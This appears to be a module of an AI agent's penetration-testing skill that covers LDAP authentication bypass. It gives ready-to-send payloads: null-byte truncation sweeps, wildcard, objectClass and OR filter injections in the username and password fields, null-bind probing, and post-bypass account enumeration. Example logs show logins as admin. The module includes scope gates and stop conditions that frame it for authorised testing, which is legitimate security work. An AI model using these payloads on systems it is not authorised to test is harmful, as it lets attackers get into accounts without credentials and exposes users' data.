# LDAP Authentication Bypass

## Prerequisites

- HIGH or MEDIUM confidence from Phase 2 (Confirmation)
- Parameter classified as **authentication context** in Phase 2 Step 2.5
- At least one field (username or password) shows behavioral difference on boolean injection

**Phase context:** This is a sub-file of Phase 4 (Exploitation) in SKILL.md.

---

## Core Principle

LDAP auth filters combine username and password in a single AND query. Injecting into either value can short-circuit the logic, forcing the entire filter to evaluate as TRUE regardless of credentials.

**Typical filter structures:**

```
OpenLDAP:         (&(uid=INPUT)(userPassword=INPUT))
Active Directory: (&(sAMAccountName=INPUT)(userPassword=INPUT))
Generic LDAP:     (&(cn=INPUT)(userPassword=INPUT))
Mail-based:       (&(mail=INPUT)(userPassword=INPUT))
```

Real applications sometimes wrap the entire filter in extra parentheses, producing deeper nesting like `((&(cn=INPUT)(userPassword=INPUT)))`. You usually won't know the exact depth — the null byte sweep in Technique A covers this automatically.

---

## Step 1: Infer the Filter Attribute

Before bypassing, identify which user attribute the application queries — and whether the server accepts absent credentials entirely.

First, send a request with the credential keys missing completely (not empty, but absent) and compare against the invalid-credential baseline. Some LDAP servers allow binding with null credentials, and the backend passes `NULL` to `ldap_bind()` only when the keys are not present at all — sending empty values does not trigger this. If the response differs (different content, redirect, session cookie, or length change >20%) → null bind confirmed.

If null bind does not succeed, probe which attribute the application queries. Wrong attribute = payload lands in dead filter.

**Probe by injecting attribute existence checks:**

```
username=*)(uid=*            password=[any]  → different from baseline? → uid used
username=*)(cn=*             password=[any]  → different from baseline? → cn used
username=*)(mail=*           password=[any]  → different from baseline? → mail used
username=*)(sAMAccountName=* password=[any]  → different from baseline? → AD environment
```

If all four attribute probes return identical responses, log [ATTR-INFERRED] unknown and proceed to Step 2 — generic payloads (objectClass=*, wildcard OR) work regardless of which attribute is used.

**Q:** How do I tell which one matches?
**A:** The one that triggers a different response (login success, redirect, longer response, different status) from the baseline invalid-login is the active attribute. If multiple trigger differences, check error messages for attribute names.

**Platform indicators:**

| Indicator | Likely Attribute |
|-----------|-----------------|
| Windows/IIS environment, AD error strings | `sAMAccountName` |
| OpenLDAP error strings, Linux | `uid` |
| Email used as username field | `mail` |
| "Common Name" in errors | `cn` |
| No clue → try all four | — |

---

## Step 2: Username Field Bypass Techniques

> **PHP + Apache/OpenLDAP stack detected?**
> Start with **Technique A (Null Byte Sweep)** before anything else. Null byte truncation is highly reliable on PHP LDAP stacks and covers multiple filter depths in just 6 payloads. Only fall through to B, C, D if A produces no bypass.

Apply each technique, run 3 times, compare against valid-login and invalid-login baselines.

---

### Technique A — Null Byte Truncation (try first on PHP stacks)

PHP's LDAP functions terminate string processing at the null byte (`%00`), dropping everything after it — including the password check. The number of closing parens needed before the null byte depends on how deeply the application wraps its filter. Sweep all depths:

```
username=admin%00           password=[any]   ← 0 parens — filter: (&(cn=admin%00...
username=admin)%00          password=[any]   ← 1 paren  — filter: (&(cn=admin)%00...
username=admin))%00         password=[any]   ← 2 parens — filter: ((&(cn=admin))%00...
username=*%00               password=[any]   ← wildcard, 0 parens
username=*)%00              password=[any]   ← wildcard, 1 paren
username=*))%00             password=[any]   ← wildcard, 2 parens
```

Run each payload once. On the first one that differs from the invalid baseline, run it 3 times to confirm. Stop as soon as any depth produces a bypass — do not continue the sweep.

**Why sweep paren depth?** Different applications wrap their LDAP filter in 1, 2, or even 3 extra parentheses. `admin%00` alone misses apps with extra nesting; `*))%00` alone misses simple filters. The 6-payload sweep costs minimal requests and covers all common real-world filter depths.

**Only works if:** Application constructs LDAP string from user input without null-byte sanitization before passing to the directory library.

---

### Technique B — Wildcard + Close + True Condition

```
username=*)(objectClass=*     password=[any]
username=*)(objectClass=top   password=[any]
username=*)(uid=*             password=[any]
```

**Resulting filter (example):**
`(&(uid=*)(objectClass=*)(userPassword=anything))` — `objectClass=*` always true, password check neutralized.

---

### Technique C — Specific User + Filter Escape

Target a known username to bypass their password specifically:

```
username=admin)(objectClass=*    password=[any]
username=admin)(uid=*            password=[any]
username=admin)(&                password=[any]
```

**Resulting filter:**
`(&(uid=admin)(objectClass=*)(userPassword=anything))` — login as `admin` without correct password.

---

### Technique D — OR Operator Injection

```
username=)(|(uid=*)(&(uid=dummy   password=[any]
username=admin)(|(uid=admin       password=[any]
```

**Why this works:** OR branch makes the filter evaluate TRUE on the first matching condition, ignoring the password.

---

## Step 3: Password Field Bypass Techniques

Test these if the username field appears sanitized. Send a known valid username in the username field:

### Technique E — Password Wildcard OR

```
username=admin    password=*)|(objectClass=*
username=admin    password=*)|(uid=*
username=admin    password=*)(|(userPassword=*
```

**Resulting filter:**
`(&(uid=admin)(userPassword=*)|(objectClass=*))` — OR makes it TRUE regardless of password.

### Technique F — Password Close + True

```
username=admin    password=*)(objectClass=*
username=admin    password=anything)(uid=*
```

---

## Step 4: Confirm Bypass

**Always capture full HTTP response including headers** (`curl -i` or equivalent). A successful bypass may return a 302 redirect rather than a 200 with different body content — if you only inspect the body, you will miss it.

**Run confirmed bypass 3 times:**

```
[RUN 1] username={payload} password={any} → Status: {x}, Length: {y}, Content: {z}
[RUN 2] username={payload} password={any} → Status: {x}, Length: {y}, Content: {z}
[RUN 3] username={payload} password={any} → Status: {x}, Length: {y}, Content: {z}

[BASELINE-VALID]   username=alice password=correct → Status: {x}, Length: {y}
[BASELINE-INVALID] username=ZZZZ password=wrong   → Status: {x}, Length: {y}
```

Bypass confirmed if runs 1–3 match the valid baseline and not the invalid baseline.

**Success signals to check — any one of these counts:**
- Response body contains an authenticated string ("Welcome", "Dashboard", "AUTHENTICATED", username shown)
- HTTP 302 redirect where baseline returns 200
- Response length differs from invalid baseline by >20%
- Session cookie set in `Set-Cookie` header where baseline sets none

**If no valid-login baseline exists:** Bypass is confirmed if runs 1–3 produce any of the success signals above compared to the invalid baseline.

**Confidence:**
- HIGH: 3/3 consistent success signal
- MEDIUM: 2/3 — retest with minor payload variation

> **NEGATIVE VERDICT — Username Field**
>
> Techniques A, B, C, D tested. All 3 runs per technique match the invalid-login baseline, not the valid-login baseline. Username field bypass not confirmed.
>
> Proceed to password field bypass (Techniques E–F) before concluding.

> **NEGATIVE VERDICT — Password Field**
>
> Techniques E and F tested on valid username. All runs match invalid-login baseline.
>
> Both fields tested — auth bypass not achievable via LDAP filter injection. Stop. Return to SKILL.md Phase 3 (Negative Verdict) and document.

---

## Step 5: Account Enumeration (Post-Bypass)

**Scope gate:** Only proceed here if the engagement scope explicitly authorizes post-bypass enumeration. If scope is not confirmed, STOP at Step 4 and report CRITICAL.

Once bypass confirmed and scope permits, enumerate valid accounts for reporting completeness.

**Q:** Why enumerate if bypass is already confirmed?
**A:** Knowing *which accounts* are affected (especially privileged ones) is essential for the impact assessment.

### Username Existence via Scoped Bypass

Test whether a specific account exists by making the bypass conditional on that account:

```
username=alice)(uid=alice     password=[any]  → login success? alice exists
username=bob)(uid=bob         password=[any]  → login success? bob exists
username=ZZZFAKE)(uid=ZZZFAKE password=[any]  → login success? should fail if not exists
```

Enumerate common accounts: `admin`, `administrator`, `root`, `service`, `svc`, `ldapadmin`, `readonly`.

**Attempt limit:** Max 10 username probes. Stop after confirming 2–3 privileged accounts exist — sufficient for report.

---

## Reasoning Format

```
[LDAP-AUTHBYPASS]
[FIELD-TESTED]    {username / password / both}
[ATTR-INFERRED]   {uid / cn / sAMAccountName / mail / unknown}
[FILTER-GUESS]    {e.g., (&(uid=X)(userPassword=Y))}
[TECHNIQUE]       {A / B / C / D / E / F}
[PAYLOAD]         {exact string sent}
[RUNS]            {X}/3 consistent success signal
[CONFIDENCE]      {HIGH / MEDIUM / LOW}
[VERDICT]         {Bypass confirmed / Not confirmed}
[ACTION]          {STOP — Report CRITICAL / Proceed to enumeration if scope permits / Negative — return to SKILL.md}
```

---

## Stop Conditions

| Condition | Action |
|-----------|--------|
| Null bind confirmed (absent credentials) | **STOP.** Report CRITICAL. Do not test filter injection. |
| Bypass confirmed once (filter injection) | **STOP.** Report CRITICAL. Do not attempt further bypasses or bulk access. |
| Proceeding to Step 5 (enumeration) | Only if scope explicitly permits post-bypass enumeration. Default: STOP at Step 4. |
| Account lockout warning appears | **STOP immediately.** Coordinate with stakeholders. |
| Rate limiting (HTTP 429) | Back off. Document rate limit presence. |
| 3+ consecutive 5xx errors | Stop. Directory or app instability. |
| Enumerated 3+ privileged accounts | Enough for impact — stop enumeration. |

---

## Common LDAP Filter Structures by Platform

| Platform | Typical Auth Filter |
|----------|-------------------|
| OpenLDAP | `(&(uid=X)(userPassword=Y))` |
| Active Directory | `(&(sAMAccountName=X)(unicodePwd=Y))` or `(&(sAMAccountName=X))` then Kerberos |
| FreeIPA | `(&(uid=X)(krbPrincipalName=X@REALM))` |
| Oracle Directory | `(&(cn=X)(userPassword=Y))` |
| Novell eDirectory | `(&(cn=X)(userPassword=Y))` |
| Generic LDAP middleware | `(&(mail=X)(userPassword=Y))` |

---

## Few-Shot Examples

### Example 1: Null Bind — Absent Credentials

```
[LDAP-AUTHBYPASS]
[TECHNIQUE]   Null bind — no credential keys in request
[BASELINE]    invalid credentials → 200, 2249 bytes, "invalid credentials"
[RUN 1]       absent credentials → 200, 3104 bytes, "Welcome admin" ✓
[RUN 2]       absent credentials → 200, 3104 bytes ✓
[RUN 3]       absent credentials → 200, 3104 bytes ✓
[CONFIDENCE]  HIGH (3/3)
[VERDICT]     Null bind confirmed — LDAP server accepts absent credentials
[ACTION]      STOP — Report CRITICAL
```

### Example 2: Null Byte Sweep — Single-Paren Filter

```
[LDAP-AUTHBYPASS]
[FIELD-TESTED]  username
[ATTR-INFERRED] uid (OpenLDAP error strings observed)
[FILTER-GUESS]  (&(uid=X)(userPassword=Y))
[TECHNIQUE]     A — null byte truncation, paren sweep
[PAYLOAD SWEEP]
  admin%00    → UNAUTHENTICATED (0 parens — no bypass)
  admin)%00   → AUTHENTICATED as admin ✓ (1 paren — bypass)
  (stopped sweep — bypass found at depth 1)
[RUN 1]         "AUTHENTICATED as admin" ✓
[RUN 2]         "AUTHENTICATED as admin" ✓
[RUN 3]         "AUTHENTICATED as admin" ✓
[CONFIDENCE]    HIGH (3/3)
[VERDICT]       Bypass confirmed
[ACTION]        STOP — Report CRITICAL
```

### Example 3: Null Byte Sweep — Double-Paren Filter

```
[LDAP-AUTHBYPASS]
[FIELD-TESTED]  username
[ATTR-INFERRED] cn (PHP/Apache stack, generic LDAP)
[FILTER-GUESS]  ((&(cn=X)(userPassword=Y)))
[TECHNIQUE]     A — null byte truncation, paren sweep
[PAYLOAD SWEEP]
  admin%00    → UNAUTHENTICATED
  admin)%00   → UNAUTHENTICATED
  admin))%00  → AUTHENTICATED as admin ✓ (2 parens — bypass)
  (stopped sweep — bypass found at depth 2)
[RUN 1]         "AUTHENTICATED as admin" ✓
[RUN 2]         "AUTHENTICATED as admin" ✓
[RUN 3]         "AUTHENTICATED as admin" ✓
[CONFIDENCE]    HIGH (3/3)
[VERDICT]       Bypass confirmed
[ACTION]        STOP — Report CRITICAL
```

### Example 4: Wildcard Null Byte — Unknown Username

```
[LDAP-AUTHBYPASS]
[FIELD-TESTED]  username
[ATTR-INFERRED] unknown (no error leakage, no known valid username)
[FILTER-GUESS]  (&(cn=X)(userPassword=Y)) — depth unknown
[TECHNIQUE]     A — null byte truncation, wildcard + paren sweep
[PAYLOAD SWEEP]
  *%00    → UNAUTHENTICATED
  *)%00   → UNAUTHENTICATED
  *))%00  → AUTHENTICATED as hacker ✓
[RUN 1]         "AUTHENTICATED as hacker" ✓
[RUN 2]         "AUTHENTICATED as hacker" ✓
[RUN 3]         "AUTHENTICATED as hacker" ✓
[CONFIDENCE]    HIGH (3/3)
[VERDICT]       Bypass confirmed (wildcard matched first user in directory)
[ACTION]        STOP — Report CRITICAL
```

### Example 5: Redirect-Based Success — Operator Injection

```
[LDAP-AUTHBYPASS]
[FIELD-TESTED]  username
[ATTR-INFERRED] uid
[FILTER-GUESS]  (&(uid=X)(userPassword=Y))
[TECHNIQUE]     B — wildcard + objectClass=*
[PAYLOAD]       username=*)(objectClass=*  password=anything
[RUN 1]         HTTP 302 → /dashboard  (baseline invalid = HTTP 200 "Login failed") ✓
[RUN 2]         HTTP 302 → /dashboard ✓
[RUN 3]         HTTP 302 → /dashboard ✓
[CONFIDENCE]    HIGH (3/3)
[VERDICT]       Bypass confirmed via redirect signal
[ACTION]        STOP — Report CRITICAL
```

### Example 6: Password Field Bypass — Username Sanitized

```
[LDAP-AUTHBYPASS]
[FIELD-TESTED]  username → sanitized (Techniques A, B, C, D all returned invalid baseline)
                password → testing
[ATTR-INFERRED] uid
[TECHNIQUE]     E — password wildcard OR
[PAYLOAD]       username=admin  password=*)|(objectClass=*
[RUN 1]         HTTP 200, Length: 4821 (vs invalid: 1202) ✓
[RUN 2]         HTTP 200, Length: 4829 ✓
[RUN 3]         HTTP 200, Length: 4818 ✓
[CONFIDENCE]    HIGH (3/3)
[VERDICT]       Bypass confirmed via password field
[ACTION]        STOP — Report CRITICAL
```

### Example 7: Both Fields Tested — No Bypass

```
[LDAP-AUTHBYPASS]
[FIELD-TESTED]  username (Techniques A, B, C, D), password (Techniques E, F)

USERNAME FIELD:
  Technique A: all 6 paren-depth variants → 0/3 each (null byte stripped)
  Technique B: 0/3 match valid baseline
  Technique C: 0/3 match valid baseline
  Technique D: 0/3 match valid baseline

PASSWORD FIELD:
  Technique E: 0/3 match valid baseline
  Technique F: 0/3 match valid baseline

[VERDICT]  Auth bypass not achievable via LDAP injection
[ACTION]   Return to SKILL.md Phase 3 (Negative Verdict) — document negative. Check if WAF is filtering — see ldap_filter_bypass.md
```